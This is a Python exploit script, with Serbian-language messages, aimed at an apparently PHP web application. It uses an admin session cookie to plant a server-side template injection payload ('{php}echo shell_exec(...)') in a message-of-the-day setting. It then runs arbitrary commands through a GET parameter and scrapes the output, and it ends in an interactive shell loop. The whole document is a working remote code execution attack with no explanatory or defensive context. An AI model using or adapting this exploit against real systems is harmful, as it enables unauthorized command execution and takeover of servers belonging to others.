import requests
import argparse
import sys

parser = argparse.ArgumentParser()
parser.add_argument("target")
parser.add_argument("cookie")
parser.add_argument("--cmd", default="id")
args = parser.parse_args()

if args.target[-1] == "/":
    args.target = args.target[:-1]

headers = {"cookie": args.cookie}
payload = "{php}echo shell_exec($_GET['cmd']);{/php}"

print("[*] Ubacujem SSTI payload u MotD...")
r = requests.post(f"{args.target}/admin/update_motd.php", headers=headers, data={"message": payload})
if "Message set!" not in r.text:
    print(f"[-] Nije uspelo. Response: {r.text[:200]}")
    sys.exit(1)
print("[+] Payload ubacen!")

def run_cmd(cmd):
    r = requests.get(f"{args.target}/index.php", headers=headers, params={"cmd": cmd})
    html = r.text
    if "center_div\">" in html:
        after = html.split("center_div\">", 1)[1]
        if "</a>" in after:
            after = after.split("</a>", 1)[1]
        output = after.split("<br>")[0].strip()
        return output
    return ""

print(f"[*] Izvrsavam: {args.cmd}")
out = run_cmd(args.cmd)
if out:
    print(f"\n[+] RCE uspešan!\n{'='*50}\n{out}\n{'='*50}")
else:
    print("[-] Nema outputa.")

print("\n[*] Interaktivni mod (CTRL+C za izlaz):")
try:
    while True:
        cmd = input("$ ").strip()
        if cmd:
            print(run_cmd(cmd))
except KeyboardInterrupt:
    print("\n[*] Izlaz.")